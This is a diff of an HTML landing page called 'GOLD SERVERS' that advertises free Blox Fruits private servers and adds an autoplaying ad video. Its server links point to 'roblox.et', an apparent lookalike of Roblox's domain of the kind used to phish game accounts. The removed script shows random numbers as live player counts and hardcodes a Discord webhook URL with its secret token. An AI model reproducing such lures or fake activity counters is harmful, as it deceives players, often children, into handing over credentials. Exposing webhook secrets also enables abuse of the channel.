@@ -5,115 +5,124 @@
     <title>GOLD SERVERS</title>
     <style>
         body {
-            font-family: Arial, sans-serif;
-            background: linear-gradient(45deg, #1e3c72, #2a5298);
+            font-family: 'Poppins', sans-serif;
+            background: radial-gradient(circle, #1a1a2e, #16213e);
             color: white;
             text-align: center;
-            animation: fadeIn 2s ease-in-out;
+            margin: 0;
+            padding: 0;
+            animation: fadeIn 1.5s ease-in-out;
         }
         @keyframes fadeIn {
             from { opacity: 0; }
             to { opacity: 1; }
         }
-        .server-box, .dashboard-box, .feedback-box {
-            background: rgba(255, 255, 255, 0.1);
+        .container {
+            max-width: 800px;
+            margin: auto;
             padding: 20px;
-            margin: 20px auto;
-            border-radius: 10px;
-            width: 50%;
-            box-shadow: 0 0 15px rgba(255, 255, 255, 0.3);
-            transition: transform 0.3s ease;
         }
-        .server-box:hover, .dashboard-box:hover, .feedback-box:hover {
+        .header {
+            font-size: 2.5em;
+            font-weight: bold;
+            text-transform: uppercase;
+            margin-bottom: 20px;
+            animation: glow 2s infinite alternate;
+        }
+        @keyframes glow {
+            from { text-shadow: 0 0 10px #ffd700; }
+            to { text-shadow: 0 0 20px #ffcc00; }
+        }
+        .server-box {
+            background: rgba(255, 255, 255, 0.1);
+            padding: 15px;
+            margin: 15px auto;
+            border-radius: 15px;
+            width: 80%;
+            box-shadow: 0 4px 10px rgba(255, 255, 255, 0.2);
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+        }
+        .server-box:hover {
             transform: scale(1.05);
+            box-shadow: 0 6px 15px rgba(255, 255, 255, 0.3);
         }
         .server-box a {
             text-decoration: none;
-            color: #00ff00;
+            color: #ffcc00;
             font-size: 20px;
-        }
-        .countdown, .player-count {
-            margin-top: 10px;
+            font-weight: bold;
         }
         .dashboard-box {
             position: absolute;
-            top: 20px;
-            right: 20px;
-            font-size: 18px;
-            color: #ffcc00;
+            top: 15px;
+            right: 15px;
+            background: rgba(255, 255, 255, 0.2);
             padding: 10px;
-            border-radius: 5px;
+            border-radius: 10px;
+            font-size: 14px;
+            font-weight: bold;
+        }
+        .feedback-box {
+            background: rgba(255, 255, 255, 0.15);
+            padding: 15px;
+            border-radius: 15px;
+            width: 80%;
+            margin: 20px auto;
+            box-shadow: 0 4px 10px rgba(255, 255, 255, 0.2);
         }
         input, button {
-            padding: 8px;
-            margin: 5px;
-            border-radius: 5px;
+            padding: 10px;
+            margin: 10px;
+            border-radius: 10px;
+            border: none;
+            font-size: 16px;
+        }
+        button {
+            background: #ffcc00;
+            color: black;
+            cursor: pointer;
+            font-weight: bold;
+            transition: 0.3s;
+        }
+        button:hover {
+            background: #ffd700;
+        }
+        .ad-container {
+            background: rgba(255, 255, 255, 0.1);
+            padding: 10px;
+            margin: 20px auto;
+            border-radius: 15px;
+            width: 80%;
+            box-shadow: 0 4px 10px rgba(255, 255, 255, 0.2);
+            text-align: center;
+        }
+        .ad-container iframe {
+            width: 100%;
+            height: 315px;
+            border-radius: 10px;
         }
     </style>
 </head>
 <body>
-    <h1>GOLD SERVERS</h1><div class="dashboard-box">More private servers coming soon...</div>
+    <div class="container">
+        <div class="dashboard-box">More private servers coming soon...</div>
+        <div class="header">GOLD SERVERS</div><div class="ad-container">
+        <p><strong>Paid Advertisement</strong></p>
+        <a href="https://youtu.be/XwVzskUW6sM?si=XZCMfhXEeNHFu1xf" target="_blank">
+            <iframe src="https://www.youtube.com/embed/XwVzskUW6sM?autoplay=1&loop=1&playlist=XwVzskUW6sM" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe>
+        </a>
+    </div>
 
-<div class="server-box">
-    <p><a href="https://www.roblox.et/games/2753915549/Blox-Fruits?privateServerLinkCode=59816836148209918793607839663756" target="_blank">Bloxfruit Server 1</a></p>
-    <p class="player-count" id="server1-count">Loading players...</p>
+    <div class="server-box">
+        <p><a href="https://www.roblox.et/games/2753915549/Blox-Fruits?privateServerLinkCode=59816836148209918793607839663756" target="_blank">Bloxfruit Server 1</a></p>
+        <p class="player-count" id="server1-count">Loading players...</p>
+    </div>
+
+    <div class="server-box">
+        <p><a href="https://www.roblox.et/games/2753915549/Blox-Fruits?privateServerLinkCode=59816836148209918793607839663756" target="_blank">Bloxfruit Server 2</a></p>
+        <p class="player-count" id="server2-count">Loading players...</p>
+    </div>
 </div>
-
-<div class="server-box">
-    <p><a href="https://www.roblox.et/games/2753915549/Blox-Fruits?privateServerLinkCode=59816836148209918793607839663756" target="_blank">Bloxfruit Server 2</a></p>
-    <p class="player-count" id="server2-count">Loading players...</p>
-</div>
-
-<h2>Server Restart In: <span id="countdown">60:00</span></h2>
-
-<h2>Feedback</h2>
-<div class="feedback-box">
-    <p>Report bugs or rate our site</p>
-    <input type="text" id="feedback" placeholder="Enter your feedback">
-    <button onclick="sendFeedback()">Send</button>
-</div>
-
-<script>
-    function randomPlayers() {
-        return Math.floor(Math.random() * 13);
-    }
-
-    function updatePlayerCounts() {
-        document.getElementById("server1-count").innerText = `Players: ${randomPlayers()}/12`;
-        document.getElementById("server2-count").innerText = `Players: ${randomPlayers()}/12`;
-    }
-    
-    function startCountdown() {
-        let timeLeft = 3600;
-        setInterval(() => {
-            timeLeft--;
-            let minutes = Math.floor(timeLeft / 60);
-            let seconds = timeLeft % 60;
-            document.getElementById("countdown").innerText = `${minutes}:${seconds < 10 ? '0' : ''}${seconds}`;
-            if (timeLeft === 0) {
-                timeLeft = 3600;
-                updatePlayerCounts();
-            }
-        }, 1000);
-    }
-
-    function sendFeedback() {
-        let feedback = document.getElementById("feedback").value;
-        if (feedback) {
-            fetch("https://discord.com/api/webhooks/1306937739702308915/-kxWY0Xk3Ci95HR7DjHZyw2BcMSc3CvkwMwllTDEOve0LmozUU3QgGT8k51FtCCylQiI", {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ content: `New Feedback: ${feedback}` })
-            });
-            alert("Feedback sent!");
-            document.getElementById("feedback").value = "";
-        }
-    }
-
-    setInterval(updatePlayerCounts, 3600000);
-    startCountdown();
-    updatePlayerCounts();
-</script>
 
 </body>
 </html>
